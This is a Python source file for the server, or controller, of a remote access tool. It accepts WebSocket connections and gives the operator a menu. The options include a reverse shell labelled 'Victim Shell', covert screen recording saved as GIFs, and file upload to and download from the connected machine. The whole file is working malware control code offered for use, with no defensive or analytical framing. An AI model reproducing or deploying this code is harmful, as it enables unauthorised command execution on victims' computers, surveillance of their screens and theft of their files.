import asyncio
import websockets
import chardet
import time
import imageio.v2 as imageio
import os

# A simple function to detect the character encoding of a string
def detect_character_encoding(string):
    result = chardet.detect(string)
    return result["encoding"] if result["encoding"] is not None else "utf-8"

# The main menu function
async def display_menu(websocket, path):
    # Display the menu options
    print("\nClient connected from: " + str(websocket.remote_address[0]) + "\n")
    print("1. Reverse Shell")
    print("2. Take a GIF of the client screen")
    print("3. Prank")
    print("4. Upload File")
    print("5. Download File")
    print("6. Exit\n")
    # Wait for the user to choose an option
    option = input("Choose an option: ")
    # Send the chosen option to the client
    await websocket.send(option)
    # If the user chose option 1 (Reverse Shell), enter the reverse shell loop
    if option == "1":
        await reverse_shell(websocket)
        await display_menu(websocket, path)
    # If the user chose option 2 (Take Screenshot), print a message to the console
    elif option == "2":
        await take_screenshot(websocket)
        await display_menu(websocket, path)
    # If the user chose option 3 (Return the screen), print a message to the console
    elif option == "3":
        await display_menu(websocket, path)
    # If the user chose option 4 (Exit), send the "exit" command to the client and close the WebSocket
    elif option == "4":
        await upload_file(websocket)
        await display_menu(websocket, path)
    elif option == "5":
        await download_file(websocket)
        await display_menu(websocket, path)
    elif option == "6":
        print("Exiting...")
        exit()
    else:
        print("Invalid option")
        await display_menu(websocket, path)

# The reverse shell loop function
async def reverse_shell(websocket):
    print("\nExecuting reverse shell on " + str(websocket.remote_address[0]) + "\n")
    # Enter a loop to prompt the user for commands and send them to the client
    while True:
        # Prompt the user for a command
        command = input("Victim Shell> ")
        # If the command is "exit", break out of the loop
        if command == "back":
            await websocket.send(command)
            break
        # Send the command to the client
        await websocket.send(command)
        # Wait for the response from the client
        response = await websocket.recv()
        # Detect the character encoding of the response
        character_encoding = detect_character_encoding(response)
        # Decode the response and print it to the console
        decoded_response = response.decode(character_encoding)
        print(decoded_response)

async def take_screenshot(websocket):
    imageList = []
    duration = input("How long recording should be (in minutes)? ")
    if duration == "back":
        await websocket.send(duration)
        return
    duration = (int(duration))*20
    duration_bytes = str(duration).encode()
    await websocket.send(duration_bytes)
    for i in range (duration):
        print("\nTaking screenshot on " + str(websocket.remote_address[0]))
        # Wait for the response from the client
        response = await websocket.recv()
        #Receive the binary cinents of the file and write them to a file
        file_name = str(int(time.time())) + '.png'
        imageList.append(file_name)
        with open(file_name, "wb") as file:
            file.write(response)
        print("Screenshot saved as " + file_name)
    images = [imageio.imread(path) for path in imageList]
    imageio.mimsave(str(websocket.remote_address[0]) + '.gif', images)
    for file in imageList:
        os.remove(file)

async def upload_file(websocket):
    print("\nUploading file to " + str(websocket.remote_address[0]) + "\n")
    # Prompt the user for a command
    file_path = input("File path: ")
    if file_path == "back":
        await websocket.send(file_path)
        return
    # Open the file in binary mode
    with open(file_path, "rb") as file:
        # Read the file in chunks and send each chunk over the WebSocket
        chunk = file.read(1024)
        while chunk:
            await websocket.send(chunk)
            chunk = file.read(1024)
    # Send a message to indicate that the file transfer is complete
    await websocket.send("Done")

async def download_file(websocket):
    print("\nDownloading file from " + str(websocket.remote_address[0]) + "\n")
    # Prompt the user for a command
    file_path = input("File path: ")
    if file_path == "back":
        await websocket.send(file_path)
        return
    # Send the file path to the client
    await websocket.send(file_path)
    # Receive the file size from the client
    file_size = await websocket.recv()
    file_size = int(file_size)
    # Receive and save the file contents in chunks to avoid running out of memory
    file_contents = b''
    while len(file_contents) < file_size:
        chunk = await websocket.recv()
        file_contents += chunk
    # Save the file
    file_name = str(int(time.time()))
    with open(file_name, "wb") as file:
        file.write(file_contents)

# Start the server and listen for incoming WebSocket connections
start_server = websockets.serve(display_menu, "", 8765, ping_timeout=None, max_size=None)

asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()
